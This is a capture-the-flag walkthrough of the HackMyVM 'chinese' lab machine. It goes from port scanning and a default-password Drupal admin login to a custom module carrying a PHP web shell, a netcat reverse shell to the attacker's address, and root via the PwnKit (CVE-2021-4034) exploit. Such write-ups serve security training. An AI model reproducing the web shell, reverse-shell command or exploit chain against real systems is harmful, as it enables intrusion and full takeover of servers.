name: chinese
author: chinese
category: easy
os: linux
platfrom: hackmyvm

```zsh
❯ arp-scan -I vboxnet0 -l
Interface: vboxnet0, type: EN10MB, MAC: 0a:00:27:00:00:00, IPv4: 192.168.56.1
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.100  08:00:27:49:1a:1e       PCS Systemtechnik GmbH
192.168.56.101  08:00:27:56:5d:02       PCS Systemtechnik GmbH

2 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.440 seconds (104.92 hosts/sec). 2 responded
```

```zsh
❯ ip=192.168.56.101
❯ nmap -p- -Pn $ip
Starting Nmap 7.993 ( https://nmap.org ) at 2026-11-16 09:58 +0700
Nmap scan report for chinese.local (192.168.56.101)
Host is up (0.0010s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
36321/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1.23 seconds
```

```zsh
❯ nmap -p22,80,111,36321 -sCV -Pn --min-rate 5000 $ip
Starting Nmap 7.993 ( https://nmap.org ) at 2026-11-16 09:59 +0700
Nmap scan report for chinese.local (192.168.56.101)
Host is up (0.00046s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey:
|   1024 64:cb:cb:c4:71:64:07:91:29:a7:81:da:00:ca:cd:7d (DSA)
|   2048 99:20:30:59:a7:03:9e:fa:9d:12:bb:39:64:54:0a:0b (RSA)
|   256 6a:c9:ba:44:fc:d2:d5:b0:27:bf:f8:71:3b:23:2a:38 (ECDSA)
|_  256 cb:2c:93:2b:30:d2:03:25:f0:6b:84:c2:de:12:8d:09 (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Welcome to 192.168.226.134 | 192.168.226.134
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          36321/tcp   status
|   100024  1          44752/udp6  status
|   100024  1          47994/udp   status
|_  100024  1          60914/tcp6  status
36321/tcp open  status  1 (RPC #100024)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.83 seconds
```

```zsh
❯ whatweb http://$ip
http://192.168.56.101 [200 OK] Apache[2.4.10], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Debian Linux][Apache/2.4.10 (Debian)], IP[192.168.56.101], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], PasswordField[pass], Script[text/javascript], Title[Welcome to 192.168.226.134 | 192.168.226.134], UncommonHeaders[x-content-type-options,x-generator], X-Frame-Options[SAMEORIGIN]
```

tried using most commonly credential for login page admin:
![[Pasted image 20261116100052.png]]

![[Pasted image 20261116100358.png]]

got the way in as admin, in the modul header tab we can install new modul, here i'll make my own modul named shellmod

```zsh
❯ mkdir shellmod
❯ cd shellmod
❯ vim shellmod.info
❯ cat shellmod.info
name = Shell Module
description = test
core = 7.x
package = Custom
❯ vim shellmod.module
❯ cat shellmod.module
<?php
// dummy
❯ vim shell.php
❯ cat shell.php
<?php
if (isset($_REQUEST['cmd'])){
    system($_REQUEST['cmd']);
}
❯ vim .htaccess
❯ cat .htaccess
<IfModule mod_authz_core.c>
    Require all granted
</IfModule>
<IfModule !mod_authz_core.c>
    Order allow,deny
    Allow from all
</IfModule>
❯ cd ..
❯ zip -r shellmod.zip shellmod/
updating: shellmod/ (stored 0%)
updating: shellmod/shellmod.info (deflated 6%)
updating: shellmod/shellmod.module (stored 0%)
updating: shellmod/shell.php (deflated 24%)
updating: shellmod/.htaccess (deflated 37%)
❯ unzip -l shellmod.zip
Archive:  shellmod.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2026-11-16 10:11   shellmod/
       67  2026-11-16 10:08   shellmod/shellmod.info
       15  2026-11-16 10:08   shellmod/shellmod.module
       68  2026-11-16 10:10   shellmod/shell.php
      145  2026-11-16 10:11   shellmod/.htaccess
---------                     -------
      295                     5 files
```


enable new module that has installed in drupal:
![[Pasted image 20261116101342.png]]

here we can access our payload in:
![[Pasted image 20261116101526.png]]

here we got rce:
```zsh
❯ curl -s "http://192.168.56.101/sites/all/modules/shellmod/shell.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


letsdo revshell:

```zsh
❯ curl -s "http://192.168.56.101/sites/all/modules/shellmod/shell.php?cmd=busybox%20nc%20192.168.56.1%209999%20-e%20%2Fbin%2Fbash"
```

```zsh
❯ nc -lvnp 9999
Listening on 0.0.0.0 9999
Connection received on 192.168.56.101 54771
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@chinese:/var/www/html/sites/all/modules/shellmod$ ^Z
[1]  + 435689 suspended  nc -lvnp 9999
❯ stty raw -echo; fg
[1]  + 435689 continued  nc -lvnp 9999

www-data@chinese:/var/www/html/sites/all/modules/shellmod$ export TERM=xterm
www-data@chinese:/var/www/html/sites/all/modules/shellmod$ export SHELL=/bin/bash
www-data@chinese:/var/www/html/sites/all/modules/shellmod$ stty rows 120 cols 180
```


vector attack become root:
```zsh
www-data@chinese:/var/www/html$ find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null
-rwsr-xr-x 1 root root 30800 Jan 22  2016 /bin/fusermount
-rwsr-xr-x 1 root root 27416 Mar 30  2015 /bin/umount
-rwsr-xr-x 1 root root 146160 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 40000 Mar 30  2015 /bin/mount
-rwsr-xr-x 1 root root 40168 May 17  2017 /bin/su
-rwsr-xr-x 1 root root 90456 Aug 13  2014 /sbin/mount.nfs
-rwsr-xr-x 1 root root 75376 May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 39912 May 17  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 23184 Sep  6  2016 /usr/bin/pkexec
-rwsr-sr-x 1 root root 10104 Apr  1  2014 /usr/bin/X
-rwsr-sr-x 1 root mail 89248 Nov 19  2017 /usr/bin/procmail
-rwsr-xr-x 1 root root 44464 May 17  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 53616 May 17  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 157760 Sep  9  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 54192 May 17  2017 /usr/bin/passwd
-rwsr-sr-x 1 daemon daemon 55424 Sep 30  2014 /usr/bin/at
-rwsr-xr-x 1 root root 10568 Feb 13  2015 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 14672 Sep  6  2016 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-- 1 root messagebus 294512 Nov 22  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 10104 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 464904 Nov 19  2017 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 1031296 Feb 10  2018 /usr/sbin/exim4
-rwsr-xr-- 1 root dip 333560 Apr 14  2015 /usr/sbin/pppd
```

look at the version of pkexec.

```zsh
www-data@chinese:/var/www/html$ dpkg -l | grep policykit
ii  policykit-1                           0.105-15~deb8u2                      amd64        framework for managing administrative policies and privileges
ii  policykit-1-gnome                     0.105-2                              amd64        GNOME authentication agent for PolicyKit-1
www-data@chinese:/var/www/html$ /usr/bin/pkexec --version 2>&1
pkexec version 0.105
www-data@chinese:/var/www/html$ dpkg-query -W -f='${Package} ${Version}\n' policykit-1 2>/dev/null
policykit-1 0.105-15~deb8u2
```

```zsh
❯ git clone https://github.com/berdav/CVE-2021-4034.git /tmp/pwnkit
Cloning into '/tmp/pwnkit'...
remote: Enumerating objects: 92, done.
remote: Counting objects: 100% (36/36), done.
remote: Compressing objects: 100% (17/17), done.
remote: Total 92 (delta 24), reused 19 (delta 19), pack-reused 56 (from 1)
Receiving objects: 100% (92/92), 22.71 KiB | 38.00 KiB/s, done.
Resolving deltas: 100% (44/44), done.
❯ cd /tmp/pwnkit
❯ ls -la cve-2021-4034.c pwnkit.c Makefile
-rw-r--r-- 1 setyanoegraha setyanoegraha 292 Nov 16 12:44 cve-2021-4034.c
-rw-r--r-- 1 setyanoegraha setyanoegraha 469 Nov 16 12:44 Makefile
-rw-r--r-- 1 setyanoegraha setyanoegraha 339 Nov 16 12:44 pwnkit.c
```

```zsh
❯ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
192.168.56.101 - - [16/Nov/2026 12:47:07] "GET /cve-2021-4034.c HTTP/1.1" 200 -
192.168.56.101 - - [16/Nov/2026 12:47:13] "GET /pwnkit.c HTTP/1.1" 200 -
192.168.56.101 - - [16/Nov/2026 12:47:19] "GET /Makefile HTTP/1.1" 200 -
```

```zsh
www-data@chinese:/tmp$ wget http://192.168.56.1:8888/cve-2021-4034.c
converted 'http://192.168.56.1:8888/cve-2021-4034.c' (ANSI_X3.4-1968) -> 'http://192.168.56.1:8888/cve-2021-4034.c
--2026-11-16 13:47:05--  http://192.168.56.1:8888/cve-2021-4034.c
Connecting to 192.168.56.1:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 292 [text/plain]
Saving to: 'cve-2021-4034.c'

cve-2021-4034.c                                0%[

2026-11-16 13:47:05 (12.6 MB/s) - 'cve-2021-4034.c' saved [292/292]

www-data@chinese:/tmp$ wget http://192.168.56.1:8888/pwnkit.c
converted 'http://192.168.56.1:8888/pwnkit.c' (ANSI_X3.4-1968) -> 'http://192.168.56.1:8888/pwnkit.c' (UTF-8)
--2026-11-16 13:47:12--  http://192.168.56.1:8888/pwnkit.c
Connecting to 192.168.56.1:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 339 [text/plain]
Saving to: 'pwnkit.c'

pwnkit.c                                       0%[                                                                pwnkit.c                                     100%[================================================================================================>]     339  --.-KB/s   in 0s

2026-11-16 13:47:12 (47.9 MB/s) - 'pwnkit.c' saved [339/339]

www-data@chinese:/tmp$ wget http://192.168.56.1:8888/Makefile
converted 'http://192.168.56.1:8888/Makefile' (ANSI_X3.4-1968) -> 'http://192.168.56.1:8888/Makefile' (UTF-8)
--2026-11-16 13:47:18--  http://192.168.56.1:8888/Makefile
Connecting to 192.168.56.1:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 469 [application/octet-stream]
Saving to: 'Makefile'

Makefile                                       0%[                                                                Makefile                                     100%[================================================================================================>]     469  --.-KB/s   in 0s

2026-11-16 13:47:18 (35.0 MB/s) - 'Makefile' saved [469/469]

www-data@chinese:/tmp$ ls -la cve-2021-4034.c pwnkit.c Makefile
-rw-r--r-- 1 www-data www-data 469 Nov 16 13:44 Makefile
-rw-r--r-- 1 www-data www-data 292 Nov 16 13:44 cve-2021-4034.c
-rw-r--r-- 1 www-data www-data 339 Nov 16 13:44 pwnkit.c
```

```zsh
www-data@chinese:/tmp$ make
cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
cc -Wall    cve-2021-4034.c   -o cve-2021-4034
echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
mkdir -p GCONV_PATH=.
cp -f /bin/true GCONV_PATH=./pwnkit.so:.
```

```zsh
www-data@chinese:/tmp$ ./cve-2021-4034
# su -
root@chinese:~# id;whoami;hostname
uid=0(root) gid=0(root) 组=0(root)
root
chinese
```

```zsh
root@chinese:~# find / -type f \( -name 'user.txt' -o -name 'root.txt' \) 2>/dev/null | xargs cat
CHINESE{web_low_privilege_success}
flag{You win!}
```